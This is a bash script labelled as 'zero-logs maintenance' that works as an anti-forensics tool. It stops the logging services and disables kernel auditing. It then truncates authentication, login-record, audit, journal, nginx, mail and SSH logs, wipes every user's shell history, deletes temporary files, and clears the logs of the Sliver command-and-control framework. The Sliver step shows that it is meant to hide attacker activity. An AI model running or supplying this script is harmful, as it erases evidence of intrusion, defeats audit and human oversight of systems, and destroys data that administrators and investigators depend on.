#!/bin/bash
# Zero-logs maintenance script

# Set aggressive umask to minimize permission footprint
umask 077

# Configuration
LOG_DIRS=(
    "/var/log"
    "/var/spool/mail"
    "/var/spool/postfix"
    "/var/lib/dhcp"
    "/root/.bash_history"
    "/home/*/.bash_history"
    "/var/lib/nginx"
)

SYSTEM_LOGS=(
    "auth.log"
    "syslog"
    "messages"
    "kern.log"
    "daemon.log"
    "user.log"
    "btmp"
    "wtmp"
    "lastlog"
)

# Disable syslog temporarily
systemctl stop rsyslog 2>/dev/null
systemctl stop syslog-ng 2>/dev/null
systemctl stop systemd-journald 2>/dev/null

# Clear all standard logs
echo "[+] Clearing standard system logs..."
for log in "${SYSTEM_LOGS[@]}"; do
    find /var/log -name "$log*" -exec truncate -s 0 {} \; 2>/dev/null
    find /var/log -name "$log*" -exec cat /dev/null > {} \; 2>/dev/null
done

# Clear all journal logs
echo "[+] Clearing systemd journal..."
journalctl --vacuum-time=1s 2>/dev/null
rm -rf /var/log/journal/* 2>/dev/null

# Clear audit logs
echo "[+] Clearing audit logs..."
auditctl -e 0 2>/dev/null
cat /dev/null > /var/log/audit/audit.log 2>/dev/null

# Clear bash history for all users
echo "[+] Clearing bash history..."
for histfile in /root/.bash_history /home/*/.bash_history; do
    [ -f "$histfile" ] && cat /dev/null > "$histfile" 2>/dev/null
done
history -c
cat /dev/null > ~/.bash_history 2>/dev/null
unset HISTFILE

# Clear NGINX logs
echo "[+] Clearing NGINX logs..."
for nginx_log in /var/log/nginx/*; do
    [ -f "$nginx_log" ] && cat /dev/null > "$nginx_log" 2>/dev/null
done

# Clear SSH logs
echo "[+] Clearing SSH logs..."
cat /dev/null > /var/log/auth.log 2>/dev/null
cat /dev/null > /var/log/secure 2>/dev/null

# Clear mail logs
echo "[+] Clearing mail logs..."
cat /dev/null > /var/log/mail.log 2>/dev/null
cat /dev/null > /var/log/maillog 2>/dev/null

# Clear sliver logs
echo "[+] Clearing Sliver C2 logs..."
find /root/.sliver/logs -type f -exec cat /dev/null > {} \; 2>/dev/null
find /home/*/.sliver/logs -type f -exec cat /dev/null > {} \; 2>/dev/null

# Clear temporary directories
echo "[+] Clearing temporary files..."
rm -rf /tmp/* /var/tmp/* 2>/dev/null

# Clear RAM and swap
echo "[+] Clearing RAM cache and swap..."
sync
echo 3 > /proc/sys/vm/drop_caches
swapoff -a && swapon -a 2>/dev/null

# Restart logging services
systemctl start systemd-journald 2>/dev/null
systemctl start rsyslog 2>/dev/null
systemctl start syslog-ng 2>/dev/null

echo "[+] Log cleaning complete"
exit 0